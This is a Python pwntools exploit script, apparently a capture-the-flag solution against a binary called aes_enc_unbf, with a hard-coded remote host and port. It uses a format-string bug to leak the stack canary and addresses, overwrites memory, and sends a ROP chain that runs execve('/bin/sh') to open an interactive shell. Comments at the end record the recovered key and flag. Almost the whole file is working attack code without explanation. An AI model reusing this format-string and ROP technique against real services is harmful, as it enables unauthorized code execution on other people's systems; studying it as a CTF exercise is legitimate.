from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    main = 0x8048ce0
    buf = "%39$12p|%41$12p|%2026x%18$hn%34012x%19$hnAAA" + p32(0x823059a) + p32(0x8230598)
    proc.sendline(buf)
    proc.recvuntil('Your message is :-')
    canary = proc.recvuntil('00|')[:-1]
    stack = proc.recvuntil('|')[:-1]
    print '|||'
    print canary
    print '|||'
    canary = int(canary, 16)
    stack = int(stack, 16)
    stack -= 0x2e4
    bin_sh = stack - 4 + 0x100
    print hex(canary)
    print hex(stack)
    print hex(bin_sh)
    
    xor_eax_35bf35bd = 0x08199b33
    pop_eax = 0x0804c906
    pop_ebx = 0x080481e9
    pop_ecx = 0x081b9a41
    pop_edx = 0x08068212
    syscall = 0x0810fb55

    buf = "%9$nAAAA" + p32(0x8230598)
    buf += 'A' * (0x80 - len(buf))
    buf += p32(canary) + 'A' * 4 + p32(stack)
    rop = flat([pop_eax, 0xb ^ 0x35bf35bd, xor_eax_35bf35bd, pop_ebx, bin_sh, pop_ecx, 0, pop_edx, 0, syscall])
    buf += rop
    buf += 'A' * (0x100 - len(rop)) + '/bin/sh\x00'
    assert ' ' not in buf
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'i386'
    connect = 'nc 128.199.224.175 33100'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./aes_enc_unbf'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()


#IV{212&5^V!-!}IV
#BEGIN-KEY{4x@$^%`w~d##*9}END-KEY
#pctf{th4t_m0m3n1-wh3n~f0rm41`SpiLls_0v3r}
print len('\x40\x87\x68\x1a\xb0\x23\x73\xc4\x61\x44\xb4\xc0\x21\xf1\x63\x0b\x73\xe9\x0d\x38\xe4\xbd\xd8\x33\x41\x64\x2c\x43\x85\xd4\x54\x0e\xf5\xbc\x8c\x02\xdb\xee\x0d\xe8\xd6\x29\x81\x3a\x5f\xcb\x63\xbd')
